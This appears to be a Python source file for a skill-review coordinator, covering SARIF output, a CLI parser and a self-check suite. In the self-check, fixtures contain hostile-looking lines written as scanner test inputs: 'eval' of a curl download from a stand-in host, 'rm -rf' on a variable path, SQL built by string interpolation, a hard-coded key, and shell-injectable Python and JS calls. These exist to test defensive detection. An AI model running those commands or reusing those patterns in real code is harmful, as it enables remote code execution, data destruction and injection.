def split_evidence(evidence):
    """Separate `path:line` into a path and a 1-based line, if a line is present.

    Evidence is required to name a path but not a line, so a finding about a
    whole file stays a file-level result rather than being forced onto line 1,
    which would put an annotation on an arbitrary line of source.
    """
    path, separator, tail = evidence.rpartition(":")
    if separator and tail.isdigit() and path:
        return path, int(tail)
    return evidence, None


def sarif_location(evidence):
    path, line = split_evidence(evidence)
    location = {"artifactLocation": {"uri": path}}
    if line is not None:
        location["region"] = {"startLine": line}
    return {"physicalLocation": location}


def write_sarif(root, state, findings):
    """Emit the same findings a machine can act on.

    report.md is human-only: a verdict cannot gate CI or annotate a pull
    request without a reviewer transcribing it. findings.json already carries
    everything SARIF needs, and record-finding requires evidence with a path,
    so the mapping to a location is total rather than best-effort.

    Constructed directly because SARIF is JSON. The obvious library, sarif-tools,
    reads and summarises SARIF rather than building it, and would pull matplotlib
    and python-docx into a coordinator that only writes a document.
    """
    rules = []
    results = []
    for phase in state["phases"]:
        rules.append(
            {
                "id": phase,
                "name": phase,
                "shortDescription": {"text": f"Skill review: {phase}"},
                "helpUri": f"{HELP_BASE}/{phase_resource(phase)}",
            }
        )
    known = {rule["id"] for rule in rules}
    for item in findings:
        if item["phase"] not in known:
            fail(f"Finding {item['id']} names phase {item['phase']!r}, which is not in the run")
        result = {
            "ruleId": item["phase"],
            "level": SARIF_LEVELS[item["severity"]],
            "message": {"text": item["summary"]},
            "locations": [sarif_location(item["evidence"])],
            "properties": {"findingId": item["id"], "disposition": item["disposition"]},
        }
        # A finding a reviewer accepted is still a finding. Dropping it would
        # misreport the review as having found nothing there.
        if item["disposition"] in ("accepted", "deferred"):
            suppression = {"kind": "external", "status": "accepted"}
            if item.get("disposition_note"):
                suppression["justification"] = item["disposition_note"]
            result["suppressions"] = [suppression]
        results.append(result)
    document = {
        "$schema": SARIF_SCHEMA,
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": TOOL_NAME,
                        "informationUri": HELP_BASE,
                        "rules": rules,
                    }
                },
                "results": results,
                "invocations": [
                    {
                        "executionSuccessful": True,
                        "endTimeUtc": now(),
                        "workingDirectory": {"uri": Path(state["skill"]["path"]).as_uri()},
                    }
                ],
            }
        ],
    }
    write_json(root / "report.sarif", document)


def command_self_check(_args):
    import subprocess
    import tempfile

    executable = Path(__file__).resolve()

    def execute(*arguments, check=True):
        return subprocess.run(
            [sys.executable, str(executable), *map(str, arguments)],
            check=check,
            capture_output=True,
            text=True,
        )

    def settle(run, phase):
        """Answer whatever the phase still asks, for cases testing something else.

        Cases about drift detection or note validation should not have to
        restate the whole contract to reach the code they exercise.
        """
        for identifier, _ in phase_questions(phase):
            execute(
                "answer",
                "--run-dir",
                run,
                "--question",
                identifier,
                "--verdict",
                "holds",
                "--evidence",
                "SKILL.md:1 checked",
                check=False,
            )

    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary)

        # A plain skill with no workflow surfaces walks only mandatory phases.
        plain = root / "plain"
        plain.mkdir()
        # Frontmatter included because init now seeds the findings a parser can
        # settle, and a fixture that is not a valid skill would open every run
        # with conformance findings the rest of this check did not record.
        (plain / "SKILL.md").write_text(
            "---\nname: plain\ndescription: Does one thing directly.\n---\n\n# Plain\n\nDo one thing directly.\n"
        )
        run = root / "plain-run"
        result = execute("init", "--skill", plain, "--run-dir", run)
        # A conformant skill opens with nothing already known against it, so a
        # seeded finding always means the validator found something real.
        assert json.loads((run / "findings.json").read_text())["findings"] == []

        # A skill the format would reject opens with that already recorded, and
        # blocking, so the verdict gate cannot close over it unanswered. Before
        # this, a reviewer who did not happen to count the description's
        # characters passed a skill no host would load.
        broken = root / "broken"
        broken.mkdir()
        (broken / "SKILL.md").write_text(f"---\nname: broken\ndescription: {'d' * 1100}\n---\n\n# Broken\n")
        broken_run = root / "broken-run"
        execute("init", "--skill", broken, "--run-dir", broken_run)
        seeded = json.loads((broken_run / "findings.json").read_text())["findings"]
        assert [item["severity"] for item in seeded] == ["blocking"], seeded
        assert seeded[0]["source"] == "conformance:description", seeded
        assert seeded[0]["id"] == "F1", seeded

        # A skill can be perfectly conformant and still do the things the
        # safety phase exists to ask about, and that phase used to open with
        # nothing recorded: an agent that did not read the shell blocks
        # carefully answered its questions by assuming. The shapes a pattern
        # can locate are recorded first, so the reading starts somewhere.
        risky = root / "risky"
        (risky / "scripts").mkdir(parents=True)
        (risky / "SKILL.md").write_text("---\nname: risky\ndescription: d\n---\n\n# Risky\n")
        (risky / "scripts" / "clean.sh").write_text(
            "#!/bin/sh\n"
            'rm -rf "$TARGET"/\n'
            'eval "$(curl -s http://example.invalid/i.sh)"\n'
            "db.Query(\"SELECT * FROM users WHERE id = '$NAME'\")\n"
            'api_key = "abcdef0123456789abcdef"\n'
        )
        risky_run = root / "risky-run"
        execute("init", "--skill", risky, "--run-dir", risky_run)
        leads = [
            item
            for item in json.loads((risky_run / "findings.json").read_text())["findings"]
            if item["source"] == "safety-scan"
        ]
        assert len(leads) == 4, leads
        assert {item["phase"] for item in leads} == {"safety"}, leads
        # Never blocking: whether a shape is a defect depends on where the
        # value came from, which is the reader's call, not the scanner's.
        assert {item["severity"] for item in leads} == {"major"}, leads
        for item in leads:
            assert ":" in item["evidence"] and item["remedy"], item

        # The question those leads answer must not be asked again. Checked
        # here through the gate rather than against answered_by_findings
        # alone, because the mapping existing is not the same as the gate
        # consulting it: with the two unjoined, a run would locate a defect
        # and then still demand the reviewer establish it by hand.
        settled_by_scan = anchored_question("safety-scan")
        assert settled_by_scan not in [identifier for identifier, _ in outstanding_questions(risky_run, "safety")], (
            f"{settled_by_scan} was asked again despite a finding that answers it"
        )
        # And silent on a skill that does none of it, or the leads are noise
        # a reviewer learns to skip past.
        assert safety_findings(plain) == [], safety_findings(plain)

        # The shell-shaped patterns saw only shell. A dangerous command built
        # in a language and handed to a shell went unreported, which is the
        # line the safety phase exists to find, so each language spelling is
        # replayed with the safe form of the same call beside it.
        language = root / "language"
        language.mkdir()
        (language / "SKILL.md").write_text("---\nname: language\ndescription: " + "d" * 40 + "\n---\n\n# L\n")
        unsafe = [
            'os.system("rm -rf " + target)',
            'os.system(f"rm -rf {path}")',
            'subprocess.run(f"rm -rf {path}", shell=True)',
            "shutil.rmtree(user_supplied)",
            "eval(user_input)",
        ]
        (language / "run.py").write_text("\n".join(unsafe) + "\n")
        (language / "run.js").write_text("child_process.exec(`git checkout ${branch}`)\nexecSync('rm -rf ' + dir)\n")
        located = {item["evidence"] for item in safety_findings(language)}
        assert located == {f"run.py:{number}" for number in range(1, len(unsafe) + 1)} | {"run.js:1", "run.js:2"}, (
            located
        )
        # The safe spelling of each is the whole point of reporting the unsafe
        # one, so a scanner that cannot tell them apart reports nothing useful.
        safe = [
            'subprocess.run(["rm", "-rf", str(path)], check=True)',
            'os.system("clear")',
            'shutil.rmtree("build")',
            'exec(compile(source, "<x>", "exec"), namespace)',
            "# eval(x) would be unsafe here",
            "result = evaluate(data)",
            "shell = True  # documented, and no command on this line",
        ]
        (language / "run.py").write_text("\n".join(safe) + "\n")
        (language / "run.js").write_text("execFile('git', ['checkout', branch])\n")
        assert safety_findings(language) == [], safety_findings(language)

        # A reference nothing names is unreachable: an agent following the
        # skill can never load it. Reviewers miss this because it is an
        # absence, and no file draws attention to the file that is missing
        # from it. Two corpus skills ship references in exactly this state.
        stranded = root / "stranded"
        (stranded / "references").mkdir(parents=True)
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\n# Stranded\n\nSee [linked](references/linked.md).\n"
        )
        (stranded / "references" / "linked.md").write_text("# Linked\n")
        (stranded / "references" / "orphan.md").write_text("# Orphan\n\nNothing points here.\n")
        stray = unreachable_findings(stranded)
        assert [item["evidence"] for item in stray] == ["references/orphan.md"], stray
        assert stray[0]["phase"] == "structure", stray
        # Naming it anywhere is enough. A reference a README lists by bare
        # name is findable, and reporting it would train reviewers to skip
        # the category wholesale.
        (stranded / "README.md").write_text("Background lives in orphan.md.\n")
        assert unreachable_findings(stranded) == [], unreachable_findings(stranded)
        # A file naming only itself is still stranded.
        (stranded / "README.md").unlink()
        (stranded / "references" / "orphan.md").write_text("# Orphan\n\nSee orphan.md above.\n")
        assert [item["evidence"] for item in unreachable_findings(stranded)] == ["references/orphan.md"]
        # Asserted through init, not just the function: computing a finding
        # and never seeding it leaves the reviewer exactly as uninformed.
        stranded_run = root / "stranded-run"
        execute("init", "--skill", stranded, "--run-dir", stranded_run)
        sources = [item["source"] for item in json.loads((stranded_run / "findings.json").read_text())["findings"]]
        assert "structure:unreachable" in sources, sources

        # The naming rule is stated once and then applied by eye across a
        # whole tree, which is the sweep attention is worst at: one odd name
        # among conforming ones does not stand out.
        (stranded / "references" / "Bad_Name.md").write_text("# Bad\n")
        named = naming_findings(stranded)
        assert [item["evidence"] for item in named] == ["references/Bad_Name.md"], named
        assert named[0]["severity"] == "minor", named
        # A README keeps its conventional case wherever it sits, and a
        # family-first hyphenated stem is the convention, not a breach.
        (stranded / "references" / "README.md").write_text("# Readme\n")
        (stranded / "references" / "state-machine.md").write_text("# Family first\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == ["references/Bad_Name.md"]
        # The exact ecosystem names outrank the convention wherever they sit,
        # and only those: `Makefile` is one, `Makefile.md` is a markdown file
        # borrowing its case.
        (stranded / "Makefile").write_text("all:\n")
        (stranded / "LICENSE").write_text("MIT\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == ["references/Bad_Name.md"]
        # Every directory is checked, not a list of resource directories. The
        # rule is about a name being portable and predictable, which does not
        # stop being true one directory over, and scoping it to four names left
        # a skill keeping its files anywhere else entirely unchecked.
        (stranded / "assets").mkdir()
        (stranded / "assets" / "Brand_Brief.md").write_text("# Asset\n")
        (stranded / "bin").mkdir()
        (stranded / "bin" / "SignDocument.py").write_text("x = 1\n")
        assert [item["evidence"] for item in naming_findings(stranded)] == [
            "assets/Brand_Brief.md",
            "bin/SignDocument.py",
            "references/Bad_Name.md",
        ], naming_findings(stranded)
        naming_run = root / "naming-run"
        execute("init", "--skill", stranded, "--run-dir", naming_run)
        sources = [item["source"] for item in json.loads((naming_run / "findings.json").read_text())["findings"]]
        assert "structure:naming" in sources, sources

        state = read_status(result.stdout)
        assert state["phases"] == list(ALWAYS_FIRST + ALWAYS_LAST), state["phases"]
        assert state["detail"]["surfaces"] == [], state

        # Evidence in the skill, not a checklist, selects the extra phases.
        rich = root / "rich"
        (rich / "scripts").mkdir(parents=True)
        (rich / "SKILL.md").write_text("# Rich\n\nRun the coordinator and resume from state.json.\n")
        (rich / "scripts" / "settings.py").write_text("# settings adapter\n")
        rich_run = root / "rich-run"
        result = execute("init", "--skill", rich, "--run-dir", rich_run)
        state = read_status(result.stdout)
        assert {"coordinator", "state"} <= set(state["detail"]["surfaces"]), state
        assert "settings" in state["detail"]["surfaces"], state
        assert state["phases"][0] == "activation" and state["phases"][-1] == "verdict"
        inventory = json.loads((rich_run / "inventory.json").read_text())
        assert inventory["evidence"]["state"], "state surface must carry file evidence"

        # An explicit skip removes a detected surface and its phase.
        skipped_run = root / "skipped-run"
        result = execute("init", "--skill", rich, "--run-dir", skipped_run, "--skip-surface", "settings")
        assert "settings" not in read_status(result.stdout)["detail"]["surfaces"]

        # Which phases exist is decided from the surfaces present at init, so a
        # surface that appears afterwards has no phase to examine it and would
        # still collect the run's verdict. A new file is the case that matters
        # most, because it is the one that adds unreviewed capability; an edit
        # and a deletion are checked too, since a digest that missed either
        # would let the same tree be described by conclusions about another.
        for label, change in (
            ("added", lambda tree: (tree / "extra.md").write_text("new surface\n")),
            ("edited", lambda tree: (tree / "SKILL.md").write_text("# Changed\n\nElse.\n")),
            ("deleted", lambda tree: (tree / "SKILL.md").unlink()),
        ):
            drifting = root / f"drift-{label}"
            drifting.mkdir()
            (drifting / "SKILL.md").write_text("# Drift\n\nDo one thing directly.\n")
            drift_run = root / f"drift-run-{label}"
            execute("init", "--skill", drifting, "--run-dir", drift_run)
            change(drifting)
            outcome = execute(
                "complete-phase", "--run-dir", drift_run, "--phase", "activation", "--note", "x", check=False
            )
            assert outcome.returncode == EX_DATAERR, (label, outcome.returncode, outcome.stdout)
            assert "changed since this review began" in outcome.stderr, (label, outcome.stderr)
            # A finding cites a path and a line, so it is a claim about the tree
            # too and must be refused for the same reason.
            finding = execute(
                "record-finding",
                "--run-dir",
                drift_run,
                "--phase",
                "activation",
                "--severity",
                "minor",
                "--summary",
                "x",
                "--evidence",
                "SKILL.md:1",
                check=False,
            )
            assert finding.returncode == EX_DATAERR, (label, finding.returncode)

        # Blocking drift is only correct if the documented recovery still works.
        # add-surface exists for a surface that "surfaces late", which is the
        # same event as the tree changing, so it re-baselines: without that the
        # guard turns the intended remedy into a dead end where a run can be
        # extended and then never closed.
        late = root / "late-surface"
        late.mkdir()
        (late / "SKILL.md").write_text("# Late\n\nDo one thing directly.\n")
        late_run = root / "late-surface-run"
        execute("init", "--skill", late, "--run-dir", late_run)
        (late / "scripts").mkdir()
        (late / "scripts" / "coordinator.py").write_text("# late arrival\n")
        blocked = execute("complete-phase", "--run-dir", late_run, "--phase", "activation", "--note", "x", check=False)
        assert blocked.returncode == EX_DATAERR, blocked.returncode
        execute("add-surface", "--run-dir", late_run, "--surface", "coordinator")
        settle(late_run, "activation")
        resumed = execute("complete-phase", "--run-dir", late_run, "--phase", "activation", "--note", "x", check=False)
        assert resumed.returncode == 0, resumed.stderr
        assert "coordinator" in read_json(late_run / "state.json")["phases"]

        # Disposing of a finding is a judgement about the evidence it cites, so
        # it is refused on a changed tree for the same reason as a phase note.
        # Checked separately because the fix-then-close sequence is the tempting
        # one: edit the skill, then mark the finding resolved in the same run,
        # recording a disposition the review never re-examined.
        disposing = root / "disposing"
        disposing.mkdir()
        (disposing / "SKILL.md").write_text("# Dispose\n\nDo one thing directly.\n")
        dispose_run = root / "disposing-run"
        execute("init", "--skill", disposing, "--run-dir", dispose_run)
        execute(
            "record-finding",
            "--run-dir",
            dispose_run,
            "--phase",
            "activation",
            "--severity",
            "blocking",
            "--summary",
            "needs work",
            "--evidence",
            "SKILL.md:1",
        )
        (disposing / "SKILL.md").write_text("# Dispose\n\nFixed it directly.\n")
        closed = execute(
            "resolve-finding",
            "--run-dir",
            dispose_run,
            "--id",
            "F1",
            "--disposition",
            "fixed",
            "--note",
            "fixed it",
            check=False,
        )
        assert closed.returncode == EX_DATAERR, closed.returncode
        assert "changed since this review began" in closed.stderr, closed.stderr

        # A phase used to close on one free-text note, so a contract asking
        # five questions was satisfiable by one sentence about whichever came
        # to mind. Questions passed over in silence were indistinguishable in
        # the record from questions asked and held.
        unanswered = execute(
            "complete-phase", "--run-dir", run, "--phase", "activation", "--note", "looks fine", check=False
        )
        assert unanswered.returncode, "a phase closed with its contract unanswered"
        assert "unanswered review questions" in (unanswered.stdout + unanswered.stderr), unanswered.stdout
        # The refusal names what would satisfy it. A gate that refuses without
        # saying what it wants gets worked around rather than answered.
        assert "activation.1" in (unanswered.stdout + unanswered.stderr), unanswered.stdout

        # An answer costs evidence whatever its verdict: `holds` is a claim
        # about the skill exactly as much as `violated` is, and an unevidenced
        # pass is what this gate exists to stop being cheap.
        #
        # Each case asserts the exit code a refusal carries, not merely a
        # non-zero one. A crash also exits non-zero, so the looser assertion
        # went on passing while the coordinator raised a traceback instead of
        # explaining itself.
        def refused(question, verdict, evidence):
            return execute(
                "answer",
                "--run-dir",
                run,
                "--question",
                question,
                "--verdict",
                verdict,
                "--evidence",
                evidence,
                check=False,
            )

        blank = refused("activation.1", "holds", " ")
        assert blank.returncode == EX_DATAERR, (blank.returncode, blank.stderr)
        # A question answered `violated` states a defect, and a defect the run
        # does not carry as a finding never reaches the report or remediation.
        no_finding = refused("activation.1", "violated", "SKILL.md:2")
        assert no_finding.returncode == EX_USAGE, (no_finding.returncode, no_finding.stderr)
        # Questions belong to phases, and a phase not yet reached has not been
        # examined, so an answer about it would be a guess on the record.
        unreached = refused("safety.1", "holds", "x.sh:1")
        assert unreached.returncode == EX_USAGE, (unreached.returncode, unreached.stderr)
        unknown = refused("activation.99", "holds", "x")
        assert unknown.returncode == EX_USAGE, (unknown.returncode, unknown.stderr)
        assert "Unknown question" in (unknown.stdout + unknown.stderr), unknown.stdout

        # A question id is its position in the contract, so editing the
        # document mid-run can slide an id onto a different question. The
        # answer already recorded would then settle a question nobody was
        # shown, and the phase would close reporting full coverage. Detected
        # by comparing the text as answered against the text as now asked, so
        # a moved question is put again.
        execute(
            "answer",
            "--run-dir",
            run,
            "--question",
            "activation.2",
            "--verdict",
            "holds",
            "--evidence",
            "SKILL.md:3",
        )
        answered_run = Path(run) / "answers.json"
        original_answers = answered_run.read_text()
        before = json.loads(original_answers)
        assert before["answers"], "no answer was recorded, so the case below proves nothing"
        identifier, entry = next(iter(before["answers"].items()))
        assert entry["question"], "an answer recorded no question text to compare against"
        phase_of = identifier.partition(".")[0]
        assert identifier not in [i for i, _ in outstanding_questions(Path(run), phase_of)], (
            "an answered question was still outstanding"
        )
        entry["question"] = "Some other question the reviewer was never shown?"
        answered_run.write_text(json.dumps(before))
        try:
            reasked = [i for i, _ in outstanding_questions(Path(run), phase_of)]
            assert identifier in reasked, f"{identifier} kept its answer after the contract moved it: {reasked}"
        finally:
            answered_run.write_text(original_answers)
        assert identifier not in [i for i, _ in outstanding_questions(Path(run), phase_of)], (
            "the case above did not restore the run's answers"
        )

        # An artifact is a file on disk between two commands, so it can be
        # edited by hand or left behind by an older version. Reading one whose
        # shape is wrong used to raise a KeyError naming a single key, which
        # says neither which file was at fault nor what it should have held.
        # The refusal is the coordinator's to make, at the boundary.
        edited = json.loads(original_answers)
        edited["answers"]["activation.3"] = {"verdict": "holds"}
        answered_run.write_text(json.dumps(edited))
        try:
            broken_status = execute("status", "--run-dir", run, check=False)
        finally:
            answered_run.write_text(original_answers)
        assert broken_status.returncode == EX_DATAERR, (broken_status.returncode, broken_status.stderr)
        assert "Traceback" not in broken_status.stderr, broken_status.stderr
        assert "answers.json" in broken_status.stderr, broken_status.stderr

        # Both artifacts a run reads, since each is loaded by its own function
        # and one validated read says nothing about the other.
        findings_path = Path(run) / "findings.json"
        original_findings = findings_path.read_text()
        damaged = json.loads(original_findings)
        damaged["findings"].append({"id": "F99"})
        findings_path.write_text(json.dumps(damaged))
        try:
            broken_findings = execute("status", "--run-dir", run, check=False)
        finally:
            findings_path.write_text(original_findings)
        assert broken_findings.returncode == EX_DATAERR, (broken_findings.returncode, broken_findings.stderr)
        assert "Traceback" not in broken_findings.stderr, broken_findings.stderr
        assert "findings.json" in broken_findings.stderr, broken_findings.stderr
        assert execute("status", "--run-dir", run, check=False).returncode == 0, "the cases above broke the run"

        # The contract is parsed as CommonMark rather than scanned for lines
        # starting with a dash. Each case below was wrong under that scan: it
        # read a fenced example as a real question, and lost questions written
        # in two spellings CommonMark considers ordinary. A gate built on a
        # question list that disagrees with the document asks something nobody
        # wrote, and stays silent about something somebody did.
        contract = REVIEW_CONTRACT.read_text()
        fenced = contract.replace("### safety\n", "### safety\n\n```bash\n- Is this a question?\n```\n", 1)
        assert not any("Is this a question?" in text for text in parse_questions(fenced)["safety"]), (
            "a bullet inside a fence was read as a review question"
        )
        asterisk = contract.replace(
            "- Does a near-miss request route to the correct other skill?",
            "* Does a near-miss request route to the correct other skill?",
        )
        assert parse_questions(asterisk)["activation"] == parse_questions(contract)["activation"], (
            "an asterisk bullet was dropped, though CommonMark treats it as a list"
        )
        wrapped = contract.replace(
            "- Are prerequisites and inputs discoverable before the first mutation?",
            "- Are prerequisites and inputs\n  discoverable before the first mutation?",
        )
        assert len(parse_questions(wrapped)["activation"]) == 4, parse_questions(wrapped)["activation"]

        # Only interrogative bullets are questions. Every bullet in the phase
        # sections happens to be one today, so this is checked against a
        # contract carrying a note among them: an assertion against the real
        # document would pass whether or not the filter existed.
        noted = contract.replace(
            "- Are secrets kept out of settings, logs, and run artifacts?",
            "- Are secrets kept out of settings, logs, and run artifacts?\n- See patterns.md for worked examples.",
        )
        assert noted != contract, "the note was not inserted, so the case proves nothing"
        safety = parse_questions(noted)["safety"]
        assert all(text.endswith("?") for text in safety), safety
        assert len(safety) == len(parse_questions(contract)["safety"]), safety

        # A scan that located a defect has answered its question with evidence,
        # which is the strongest form there is. Demanding the reviewer retype
        # that answer is how a gate becomes a formality people click through,
        # so a seeded finding settles the question it was anchored to.
        assert anchored_question("safety-scan") == "safety.3", anchored_question("safety-scan")
        assert answered_by_findings([{"id": "F9", "source": "safety-scan"}]) == {"safety.3": "F9"}
        assert answered_by_findings([{"id": "F9", "source": "recorded-by-hand"}]) == {}

        # The two phases owning what every other surface delegates answer for
        # ordering, resumability, and concurrency as well, so their gate is
        # strictly larger than a plain surface's. Collapsing them to the shared
        # list would drop those questions from every run without failing.
        shared = {text for _, text in phase_questions("workers")}
        delegating = {text for _, text in phase_questions("coordinator")}
        assert shared < delegating, sorted(delegating - shared)
        assert any("resumable" in text for text in delegating - shared), sorted(delegating - shared)
        assert phase_questions("state") and set(phase_questions("state")) != set(phase_questions("workers"))

        # Phases close in order, and only with a decision note.
        settle(run, "activation")
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "structure", "--note", "x", check=False
        ).returncode
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "activation", "--note", "", check=False
        ).returncode
        execute("complete-phase", "--run-dir", run, "--phase", "activation", "--note", "triggers are specific")

        # Findings cannot attach to a phase the run has not reached.
        assert execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "verdict",
            "--severity",
            "minor",
            "--summary",
            "s",
            "--evidence",
            "e",
            check=False,
        ).returncode
        execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "structure",
            "--severity",
            "blocking",
            "--summary",
            "Destructive step lacks an approval gate",
            "--evidence",
            "SKILL.md:1",
        )
        # Evidence without a line, recorded while its phase is still open.
        execute(
            "record-finding",
            "--run-dir",
            run,
            "--phase",
            "activation",
            "--severity",
            "minor",
            "--summary",
            "Description omits a trigger",
            "--evidence",
            "SKILL.md",
        )
        execute(
            "resolve-finding",
            "--run-dir",
            run,
            "--id",
            "F2",
            "--disposition",
            "accepted",
            "--note",
            "by design",
        )
        settle(run, "structure")
        execute("complete-phase", "--run-dir", run, "--phase", "structure", "--note", "one canonical home")
        settle(run, "safety")
        execute("complete-phase", "--run-dir", run, "--phase", "safety", "--note", "gate missing")

        # The verdict is gated on every blocking finding having a disposition.
        assert execute(
            "complete-phase", "--run-dir", run, "--phase", "verdict", "--note", "ship", check=False
        ).returncode
        execute("resolve-finding", "--run-dir", run, "--id", "F1", "--disposition", "fixed", "--note", "gate added")
        execute("complete-phase", "--run-dir", run, "--phase", "verdict", "--note", "approved after fix")
        report = (run / "report.md").read_text()
        assert "F1" in report and "fixed" in report, report
        assert "1 blocking" in report, report

        # The report's coverage line and the gate are two readings of one
        # question, and they had answered it differently: the report matched
        # ids while the gate compared the recorded text, so an answer the gate
        # was still demanding was already being counted as coverage. A report
        # that overstates what a review established is the failure this whole
        # mechanism exists to prevent, so the count is taken from the gate.
        drifted = json.loads(original_answers)
        first = next(iter(drifted["answers"]))
        answered_run.write_text(json.dumps(drifted))
        run_state = json.loads((Path(run) / "state.json").read_text())
        write_report(Path(run), run_state, load_findings(Path(run)))
        honest = (Path(run) / "report.md").read_text()
        drifted["answers"][first]["question"] = "A question the reviewer was never shown?"
        answered_run.write_text(json.dumps(drifted))
        try:
            write_report(Path(run), run_state, load_findings(Path(run)))
            after = (Path(run) / "report.md").read_text()
        finally:
            answered_run.write_text(original_answers)
            write_report(Path(run), run_state, load_findings(Path(run)))

        def coverage(text):
            line = next(part for part in text.splitlines() if "Contract questions answered" in part)
            return line.rsplit(":", 1)[1].strip()

        answered, total = coverage(honest).split("/")
        assert int(answered) >= 1, coverage(honest)
        assert coverage(after) == f"{int(answered) - 1}/{total}", (coverage(honest), coverage(after))

        # The SARIF is only useful if a consumer that knows nothing about this
        # repository can read it, so validate against the published schema.
        sarif = json.loads((run / "report.sarif").read_text())
        validate_sarif(sarif)
        results = sarif["runs"][0]["results"]
        assert [item["level"] for item in results] == ["error", "note"], results
        location = results[0]["locations"][0]["physicalLocation"]
        assert location["artifactLocation"]["uri"] == "SKILL.md", location
        assert location["region"]["startLine"] == 1, location
        assert "suppressions" not in results[0], results[0]
        rules = {rule["id"] for rule in sarif["runs"][0]["tool"]["driver"]["rules"]}
        assert {item["ruleId"] for item in results} <= rules, rules

        # An accepted finding stays in the output as a suppressed result. Omitting
        # it would report the review as having found nothing at that location.
        accepted = next(item for item in results if item["properties"]["findingId"] == "F2")
        assert accepted["level"] == "note", accepted
        assert accepted["suppressions"][0]["justification"] == "by design", accepted
        # Evidence without a line stays file-level rather than pointing at line 1.
        assert "region" not in accepted["locations"][0]["physicalLocation"], accepted

        # Late surface discovery extends the plan without dropping progress.
        late = root / "late-run"
        execute("init", "--skill", plain, "--run-dir", late)
        settle(late, "activation")
        execute("complete-phase", "--run-dir", late, "--phase", "activation", "--note", "ok")
        result = execute("add-surface", "--run-dir", late, "--surface", "workers")
        state = read_status(result.stdout)
        assert "workers" in state["phases"] and "activation" in state["completed"]
        assert execute("add-surface", "--run-dir", late, "--surface", "workers", check=False).returncode

        # A run directory inside the reviewed skill would review its own output.
        assert execute("init", "--skill", plain, "--run-dir", plain / "run", check=False).returncode

        # A review that finds nothing still writes findings.json. A consumer
        # reading an absent file cannot tell a clean subject from a review that
        # never ran, and would report a passing skill as a broken run.
        clean = root / "clean-run"
        execute("init", "--skill", plain, "--run-dir", clean)
        assert (clean / "findings.json").is_file(), "clean review wrote no findings.json"
        assert read_json(clean / "findings.json")["findings"] == []

    print("self-check passed")


def parser():
    """Build the command parser, so the shape of the CLI can be asked as well as run.

    The other coordinators expose this too. It is separate from main() because
    what commands exist is a fact worth checking, and the only way to ask it of
    a parser built inside main() is to read the help text, which is prose.
    """
    parser = argparse.ArgumentParser(description="Coordinate a phased workflow-skill review.")
    # Global, so it precedes the subcommand like any other tool-wide flag. A
    # per-subcommand copy would let one run report failures in a shape another
    # run of the same coordinator does not.
    parser.add_argument(
        "--output",
        choices=("text", "json"),
        default="text",
        help="failure output shape: prose (default), or RFC 9457 problem details",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    init = subparsers.add_parser("init", help="start a review run")
    init.add_argument("--skill", type=Path, required=True)
    init.add_argument("--run-dir", type=Path, required=True)
    init.add_argument("--name")
    init.add_argument("--surface", action="append", help="review this surface even without detected evidence")
    init.add_argument("--skip-surface", action="append", help="drop a detected surface from the plan")
    init.set_defaults(handler=command_init)

    status = subparsers.add_parser("status", help="show phase, resource, and next action")
    status.add_argument("--run-dir", type=Path, required=True)
    status.add_argument(
        "--history",
        action="store_true",
        help="show the run's transition log instead of its current status",
    )
    status.set_defaults(handler=command_status)

    record = subparsers.add_parser("record-finding", help="record one finding against a reached phase")
    record.add_argument("--run-dir", type=Path, required=True)
    record.add_argument("--phase", required=True)
    record.add_argument("--severity", required=True, choices=SEVERITIES)
    record.add_argument("--summary", required=True)
    record.add_argument("--evidence", required=True, help="path or path:line proving the finding")
    record.add_argument(
        "--remedy",
        help="the change that would resolve this finding, when the review already knows it",
    )
    record.set_defaults(handler=command_record_finding)

    resolve = subparsers.add_parser("resolve-finding", help="give one finding an explicit disposition")
    resolve.add_argument("--run-dir", type=Path, required=True)
    resolve.add_argument("--id", required=True)
    resolve.add_argument("--disposition", required=True, choices=DISPOSITIONS)
    resolve.add_argument("--note", required=True)
    resolve.set_defaults(handler=command_resolve_finding)

    answer = subparsers.add_parser("answer", help="settle one contract question with evidence")
    answer.add_argument("--run-dir", type=Path, required=True)
    answer.add_argument("--question", required=True, help="question id, as shown by status")
    answer.add_argument("--verdict", required=True, choices=VERDICTS)
    answer.add_argument("--evidence", required=True, help="a path, a path and line, or a command and its result")
    answer.add_argument("--finding", help="the finding recording this defect; required when the verdict is violated")
    answer.set_defaults(handler=command_answer)

    complete = subparsers.add_parser("complete-phase", help="close the current phase with a decision note")
    complete.add_argument("--run-dir", type=Path, required=True)
    complete.add_argument("--phase", required=True)
    complete.add_argument("--note", required=True)
    complete.set_defaults(handler=command_complete_phase)

    add = subparsers.add_parser("add-surface", help="add a surface discovered mid-run")
    add.add_argument("--run-dir", type=Path, required=True)
    add.add_argument("--surface", required=True)
    add.set_defaults(handler=command_add_surface)

    check = subparsers.add_parser("self-check", help="verify coordinator behavior and exit")
    check.set_defaults(handler=command_self_check)

    return parser


def main():
    arguments = parser().parse_args()
    arguments.handler(arguments)


if __name__ == "__main__":
    run_cli(main)
